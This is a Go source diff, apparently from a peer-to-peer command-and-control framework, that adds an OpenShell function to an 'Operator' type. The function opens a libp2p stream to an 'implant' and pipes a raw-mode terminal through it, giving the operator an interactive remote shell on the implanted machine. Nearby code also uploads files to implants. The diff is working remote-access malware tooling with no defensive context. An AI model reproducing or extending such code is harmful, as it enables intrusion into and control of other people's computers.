@@ -3,13 +3,17 @@ package core
 import (
 	"context"
 	"fmt"
+	"io"
 	"log"
 	"os"
 	"sync"
 	"time"
 
+	"golang.org/x/term"
+
 	"github.com/libp2p/go-libp2p"
 	"github.com/libp2p/go-libp2p/core/crypto"
+	"github.com/libp2p/go-libp2p/core/peer"
 	tcp "github.com/libp2p/go-libp2p/p2p/transport/tcp"
 	"google.golang.org/protobuf/proto"
 
@@ -367,6 +371,39 @@ func (o *Operator) Upload(implantPeerID string, path string, data []byte) error 
 		Overwrite: true,
 	}
 	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeUpload, req)
+}
+
+func (o *Operator) OpenShell(implantPeerID string) error {
+	pid, err := peer.Decode(implantPeerID)
+	if err != nil {
+		return fmt.Errorf("decode peer id %s: %w", implantPeerID, err)
+	}
+
+	s, err := o.node.NewStream(o.ctx, pid, transport.ShellProtocolID)
+	if err != nil {
+		return fmt.Errorf("open shell stream to %s: %w", implantPeerID, err)
+	}
+	defer s.Close()
+
+	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
+	if err != nil {
+		return fmt.Errorf("raw terminal: %w", err)
+	}
+	defer term.Restore(int(os.Stdin.Fd()), oldState)
+
+	errCh := make(chan error, 2)
+
+	go func() {
+		_, err := io.Copy(s, os.Stdin)
+		errCh <- err
+	}()
+	go func() {
+		_, err := io.Copy(os.Stdout, s)
+		errCh <- err
+	}()
+
+	<-errCh
+	return nil
 }
 
 func (o *Operator) Close() error {
